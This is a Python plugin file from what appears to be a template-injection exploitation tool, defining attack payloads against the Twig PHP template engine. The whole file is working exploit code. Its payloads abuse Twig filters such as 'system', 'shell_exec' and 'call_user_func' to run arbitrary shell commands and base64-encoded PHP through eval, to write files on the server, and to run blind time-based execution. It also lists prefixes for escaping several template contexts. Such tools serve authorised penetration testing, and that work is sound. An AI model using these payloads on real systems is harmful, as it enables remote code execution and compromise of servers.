from plugins.languages import php
from core import bash
from utils import rand


class Twig(php.Php):
    priority = 5
    plugin_info = {
        "Description": """Twig template engine of versions >=1.41, >=2.10 and >=3.0""",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Automatic payload for Twig >=1.41, >=2.10 and >=3.0
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload for older versions of Twig
        ],
        "Engine": [
            "Homepage: https://twig.symfony.com/",
            "Github: https://github.com/twigphp/Twig",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                # Disable errors, so that "system" will not corrupt the output with a warning
                'header': '{{% for a in {{"0":"error_reporting"}}|map("ini_set") %}}{{% endfor %}}{{{{{header[0]}+{header[1]}}}}}',
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}',
                # {{7*'7'}} and a{#b#}c work in freemarker as well
                # {% set a=%i*%i %}{{a}} works in Nunjucks as well
                'test_render': f'{{{{(1..3)|filter(x => x < 3)|join("")}}}}{{{{"{rand.randstrings[0]}\n"|nl2br}}}}',
                'test_render_expected': f'12{rand.randstrings[0]}<br />'
            },
            'render_error': {
                'render': '{code}',
                'header': '{{%set h={header[0]}+{header[1]}%}}',
                'trailer': '{{%set t={trailer[0]}+{trailer[1]}%}}{{{{include([h,b,t]|join)}}}}',
                'test_render': f'{{%set a=(1..3)|filter(x => x < 3)|join("")%}}{{%set b=[a,"{rand.randstrings[0]}\n"|nl2br]|join%}}',
                'test_render_expected': f'12{rand.randstrings[0]}&lt;br /&gt;'
            },
            'write': {
                'call': 'inject',
                'write': """{{{{ ["bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}'"]|filter("system") }}}}""",
                'truncate': """{{{{ ["echo -n >{path}"]|filter("system") }}}}"""
            },
            # Hackish way to evaluate PHP code
            'evaluate': {
                'call': 'execute',
                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
                'test_os': 'echo PHP_OS;',
                'test_os_expected': r'^[\w-]+$'
            },
            'execute': {
                'call': 'render',
                'execute': """{{% for a in ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'"]|filter("system") %}}{{% endfor %}}""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'execute_error': {
                'execute': """{{%set b={{"bash -c '({{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}})'":"shell_exec"}}|map("call_user_func")|join%}}""",
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{{{ ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}'"]|filter("system") }}}}"""
            },
            'evaluate_blind': {
                'call': 'execute',
                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '{{1', 'closures': php.ctx_closures},
            {'level': 1, 'prefix': '{closure} %}}', 'suffix': '', 'closures': php.ctx_closures},
            {'level': 2, 'prefix': '#}}', 'suffix': '{#'},
            {'level': 5, 'prefix': '{closure} %}}{{% endfor %}}{{% for a in [1] %}}', 'suffix': '',
             'closures': php.ctx_closures},
            # This escapes string "inter#{"asd"}polation"
            {'level': 5, 'prefix': '{closure}}}', 'suffix': '', 'closures': php.ctx_closures},
            # This escapes string {% set %s = 1 %}
            {'level': 5, 'prefix': '{closure} = 1 %}}', 'suffix': '', 'closures': php.ctx_closures},
        ])
